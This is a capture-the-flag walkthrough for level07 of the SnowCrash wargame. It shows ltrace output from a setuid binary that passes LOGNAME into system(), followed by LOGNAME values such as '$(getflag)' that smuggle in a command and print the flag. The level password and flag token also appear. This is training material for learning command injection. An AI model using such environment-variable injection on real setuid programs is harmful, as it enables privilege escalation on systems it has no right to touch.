## level07
```
level06@SnowCrash:~$ su level07
Password: wiok45aaoguiboiki2tuin6ub
level07@SnowCrash:~$
```
```
level07@SnowCrash:~$ ll
total 24
dr-x------ 1 level07 level07  120 Mar  5  2016 ./
d--x--x--x 1 root    users    340 Aug 30  2015 ../
-r-x------ 1 level07 level07  220 Apr  3  2012 .bash_logout*
-r-x------ 1 level07 level07 3518 Aug 30  2015 .bashrc*
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07*
-r-x------ 1 level07 level07  675 Apr  3  2012 .profile*
```
```
level07@SnowCrash:~$ ltrace ./level07 
__libc_start_main(0x8048514, 1, 0xbffff7e4, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                                                         = 2007
geteuid()                                                                         = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                               = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                               = 0
getenv("LOGNAME")                                                                 = "$(getflag)"
asprintf(0xbffff734, 0x8048688, 0xbfffff5d, 0xb7e5ee55, 0xb7fed280)               = 21
system("/bin/echo $(getflag) "Check flag.Here is your token : Nope there is no token here for you sorry. Try again :)
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                            = 0
+++ exited (status 0) +++
```
`getenv("LOGNAME")`
```
level07@SnowCrash:~$ LOGNAME=test
level07@SnowCrash:~$ ./level07 
test
```
```
LOGNAME="\`getflag\`"
LOGNAME='`getflag`'
LOGNAME='$(getflag)'
```
```
level07@SnowCrash:~$ LOGNAME='$(getflag)'
level07@SnowCrash:~$ ./level07 
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```
